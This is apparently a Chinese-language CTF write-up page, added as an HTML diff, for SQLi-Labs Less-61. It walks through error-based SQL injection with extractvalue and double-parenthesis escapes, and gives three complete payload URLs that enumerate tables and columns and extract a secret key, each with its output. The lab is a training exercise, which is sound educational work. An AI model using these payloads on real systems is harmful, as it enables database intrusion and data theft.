@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-61 Challenge-8 双括号报错注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-61 Challenge-8 双括号报错注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 报错注入, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-61 (Challenge-8)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 5 次尝试，随机表名/列名。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡由于后端数据回显逻辑的变更（数组映射），联合查询失效，必须依赖 <b>报错注入（Error-Based Injection）</b>。</p>
+    <p><strong>核心区别：</strong>闭合方式变为单引号加双右括号 <code>id=(('$id'))</code>。需要构造精准的闭合符 <code>'))</code>，然后使用 <code>and</code> 拼接报错函数。受限于 <code>extractvalue</code> 的 32 字符截断限制。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：获取随机表名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1')) and extractvalue(1,concat(0x7e,(select concat(table_name,0x3a,column_name) from information_schema.columns where table_schema='challenges' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~sixaw4s2vc:id'</code>。提取出当前表名 <code>sixaw4s2vc</code>。</p>
+
+    <p><strong>第二步：精准获取密钥列名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1')) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='challenges' and table_name='sixaw4s2vc' and column_name like 'secret%' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~secret_UD6Y'</code>。定位到目标列名。</p>
+
+    <p><strong>第三步：提取 24 位密钥（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1')) and extractvalue(1,concat(0x7e,(select secret_UD6Y from challenges.sixaw4s2vc)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~WlQG2MF2c3ObaEKA2POapNZL'</code>。</p>
+    <p>将该密钥提交至页面底部的输入框，页面弹出 <code>CONGRATS YOU NAILED IT</code>，通关成功。</p>
+
+    <h2>4. 策略复盘</h2>
+    <ul>
+        <li><strong>多重嵌套闭合：</strong>当 SQL 语句采用 <code>(('$id'))</code> 这种多重嵌套时，缺少任何一个闭合符都会导致语法错误。必须精确匹配。</li>
+        <li><strong>分步数据提取：</strong>受限于 32 字符截断，利用 <code>LIMIT 1</code> 获取表名，再用 <code>LIKE 'secret%'</code> 精准定位列名，是应对短回显的最佳实践。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>复杂闭合绕过</strong>：针对带有多重括号与引号的上下文，精确构造 Payload 进行逃逸。</li>
+        <li><strong>报错注入（Error-Based）</strong>：利用数据库内置函数（如 <code>extractvalue</code>）强行触发错误，并通过错误信息外带数据。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
